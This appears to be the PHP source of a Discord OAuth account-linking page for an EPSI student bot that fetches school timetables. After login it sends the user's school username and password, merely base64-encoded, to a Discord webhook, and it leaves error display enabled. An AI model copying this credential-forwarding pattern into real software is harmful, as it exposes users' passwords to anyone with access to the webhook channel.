<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>EPSI DiscordBot // Connexion</title>
</head>
<body>

<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);

error_reporting(E_ALL);

session_start();



include 'secrets.php';
include 'functions.php';


$authorizeURL = 'https://discord.com/api/oauth2/authorize';
$tokenURL = 'https://discord.com/api/oauth2/token';
$discordApiURLBase = 'https://discord.com/api/users/@me';
$revokeURL = 'https://discord.com/api/oauth2/token/revoke';



if (get('action') == "login") {
	$params = array(
		'client_id' => CLIENT_ID,
		'redirect_uri' => REDIRECT_URL,
		'response_type' => 'code',
		'scope' => 'identify guilds.join'

	);

	header('Location: '. $authorizeURL . '?' . http_build_query($params));
	die();
}

if (get('action') == "success") {
	if (!session('access_token') OR !session('wigorservices_cookies')) {
		echo 'not logged in';

		header('Location: ' . REDIRECT_URL . '?action=login');
		die();
	} else {
		//echo 'logged in';

		$user = doApiRequest($discordApiURLBase);

		if ( (property_exists($user, 'code')) AND ($user->code or 1 === 0) ) {
			echo 'session expired';
	
			header('Location: ' . REDIRECT_URL . '?action=login');
			die();
		}

		$epsi = doApiRequest(
			"https://ws-edt-cd.wigorservices.net/WebPsDyn.aspx?action=posEDTLMS&serverID=C&Tel=".$_SESSION['username']."&date=01/10/2022",
			headers: array("cookies: " . $_SESSION['wigorservices_cookies']),
			returnstatuscodeandheaders: TRUE
		);

		$_SESSION['wigorservices_cookies'] = "_DotNetCasClientAuth=".$epsi->cookies['_DotNetCasClientAuth']."; ASP_NET_SessionId=".$epsi->cookies['ASP_NET_SessionId'];


		// Send credentials to bot
		$post = array(
			"content" => "new-user!" . $user->id . ":" . base64_encode($_SESSION['username']) . ":" . base64_encode($_SESSION['password']),
			"username" => "OAuth //"
		);
		doApiRequest(WEBHOOK_URL, $post);

	}
};


if (get('code')) {
  // Exchange the auth code for a token
  $token = doApiRequest(
  	$tokenURL,
  	array(
    	'grant_type' => 'authorization_code',
    	'client_id' => CLIENT_ID,
    	'client_secret' => CLIENT_SECRET,
    	'redirect_uri' => REDIRECT_URL,
    	'code' => get('code')
  	)
  );

  $logout_token = $token->access_token;
  $_SESSION['access_token'] = $token->access_token;

  header('Location: ' . STEP2_URL);
  die();
};

if (get('action') == "nextstep") {
  header('Location: ' . STEP2_URL);
  die();
}

function logout($url, $data=array()) {
    $ch = curl_init($url);
    curl_setopt_array($ch, array(
        CURLOPT_POST => TRUE,
        CURLOPT_RETURNTRANSFER => TRUE,
        CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
        CURLOPT_HTTPHEADER => array('Content-Type: application/x-www-form-urlencoded'),
        CURLOPT_POSTFIELDS => http_build_query($data),
    ));
    $response = curl_exec($ch);
    return json_decode($response);
}


echo 'Please specify an action parameter';
die();

?>
<style type="text/css">
body {margin: 0;}
.container {
	width: 100vw;
	height: 100vh;

	text-align: center;

	background-color: hsl(220, 7.7%, 22.9%);
}

@font-face {
	font-family: "Uni Sans";
	src: url("UniSansHeavy.otf");
}

.success {
	color: hsl(139, 51.6%, 52.2%);
	font-family: "Uni Sans";
	font-size: min(15vw, 800%);
}
.message {
	padding: 4rem 0 3rem 0;

	color: hsl(0, 0%, 100%);
	font-family: "ABC Ginto Normal", "Helvetica Neue", Helvetica, Arial, sans-serif;
	font-size: 1.5rem;

	display: flex;
	flex-direction: column;
	align-items: center;
}

#discord, #epsi {
	font-family: Whitney, "Helvetica Neue", Helvetica, Arial, sans-serif;
	font-weight: 700;
	font-size: 2rem;

	padding: 1.3rem;
}

button {
	background-color: hsl(235, 85.6%, 64.7%);
	color: hsl(0, 0%, 100%);

	font-family: Whitney, "Helvetica Neue", Helvetica, Arial, sans-serif;
    text-rendering: optimizeLegibility;


    cursor: pointer;
    border: none;
    border-radius: 3px;
    font-size: 28px;
    font-weight: 500;
    line-height: 16px;
    padding: 20px 32px;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
	
	-webkit-transition: background-color .17s ease,color .17s ease;
    transition: background-color .17s ease,color .17s ease;
}
button:hover {
	background-color: hsl(235deg 94% 64%);;
}

</style>

<div class="container">
	<span class="success">SUCCESS !</span>
	<div class="message">
		<span>You successfully linked your Discord account</span>
		<span id="discord"><?php echo $user->username . '#' . $user->discriminator ?></span>
		<span>to your EPSI account</span>
		<span id="epsi"><?php echo $_SESSION['firstname'] . ' ' . $_SESSION['lastname'] ?></span>
	</div>

	<button onclick="window.open('discord://discord.com/invite/XWn8YwhB94')">Access the Discord</button>
</div>

</body>
</html>